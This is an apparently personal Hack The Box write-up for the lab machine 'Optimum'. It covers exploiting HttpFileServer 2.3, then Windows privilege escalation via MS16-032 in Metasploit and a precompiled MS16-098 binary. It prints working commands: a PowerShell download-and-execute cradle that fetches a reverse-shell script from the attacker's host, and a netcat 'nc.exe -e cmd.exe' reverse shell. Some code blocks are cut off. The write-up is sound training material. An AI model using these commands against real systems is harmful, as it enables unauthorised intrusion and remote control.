## Optimum
Optimum was after Nibbles; I went in blind and struggled a bit.

## Ports
HTTP only. Well, that's a start.

## HTTP
On the webpage we see something called "HttpFileServer 2.3" is running; we can searchsploit this and find it's trivially exploitable. There is a python exploit:

``
python3 /opt/htb/optimum/49125.py 10.10.10.8 80 "command goes here"
``

So I use this to get a Nishang (powershell) reverse shell like I did for Devel:

``
python3 /opt/htb/optimum/49125.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/Invoke-PowerShellTcp.ps1')"
``

And from there it's user.txt. Now what? 

## Privesc
I run *systeminfo*, capture the output and run it against Windows Exploit Suggester NextGen and get information overload; it's not clear what the best option is. I upload WinPEAS both as a batch file *and* as binaries but it doesn't seem to want to run, at all. 

After some beating about the bush, I google for the privesc vulnerability. It's (intended to be) MS16-032, or a vulnerability in the Windows Secondary Logon Service. There are a variety of Powershell exploits, but I can't get them to run. 

After a while I relent, and run the whole thing through Metasploit. This uses *msf6 exploit(windows/http/rejetto_hfs_exec)* for the foothold. I run *msf6 post(multi/recon/local_exploit_suggester)* and it does point out:

>[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.

I run this, and the second time I try it works:

{% highlight shell %}
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

## Without MSF
Not satisfied with this - particularly after trying and failing to do it via PS1 scripts - I look at another writeup. This one uses an entirely different privesc vulnerability (MS16-098), with a precompiled [binary](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe).

In order to run this I need nc on the box, so I copy it up from my powershell reverse shell, along with the exploit:


{% highlight shell %}
â”€â”€(rootðŸ’€kali)-[/opt/htb/optimum]
â””â”€# nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.8] 49180

-a---         16/3/2021   8:40 ??      59392 nc.exe 
{% endhighlight %}

Next, I use the foothold exploit to trigger a netcat shell:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/htb/optimum]
â””â”€# python3 /opt/htb/optimum/49125.py 10.10.10.8 80 "C:\Temp\nc.exe -e cmd.exe 10.10.14.7 445"

{% endhighlight %}

And then I can fire the exploit:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/htb/optimum]
â””â”€# nc -nvlp 445

At the end of the day that's pretty straightforward but there's a lot for me to work on here.
